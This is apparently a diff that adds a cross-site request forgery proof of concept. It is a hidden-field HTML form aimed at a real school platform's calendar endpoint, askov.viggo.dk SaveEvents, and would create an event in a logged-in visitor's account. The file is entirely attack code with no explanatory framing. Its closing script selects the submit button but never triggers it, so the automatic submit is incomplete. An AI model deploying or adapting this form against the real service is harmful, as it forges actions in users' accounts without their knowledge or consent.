@@ -1,0 +1,16 @@
+<form action="https://askov.viggo.dk/Shared/Events/SaveEvents" class="ajax" method="post">
+    <input id="CalendarId" name="CalendarId" type="hidden" value="0">
+    <input type="hidden" name="IsPrivate" value="true">
+    <input class="cursor-selected empty-value" id="Headline" name="Headline" tabindex="1" type="text" value="">
+    <textarea class="richeditor" id="Description" name="Description" tabindex="2"></textarea>
+    <input id="refCalendarPremisesId" name="refCalendarPremisesId" type="hidden" value="0">
+    <input type="text" name="PlaceName" class="small">
+    <input type="text" tabindex="4" readonly="" autocomplete="off" name="startdate" class="date" data-end="enddate" id="startdate" value="01-05-2024">
+    <input type="text" tabindex="5" readonly="" autocomplete="off" name="starttime" class="time" value="00:00">
+    <input type="text" tabindex="4" readonly="" autocomplete="off" name="enddate" class="date" data-start="startdate" id="enddate" value="01-05-9999">
+    <input type="text" tabindex="5" readonly="" autocomplete="off" name="endtime" class="time" value="00:00">
+    <button type="submit" id="submit"></button>
+</form>
+<script>
+    document.getElementById("submit")
+</script>
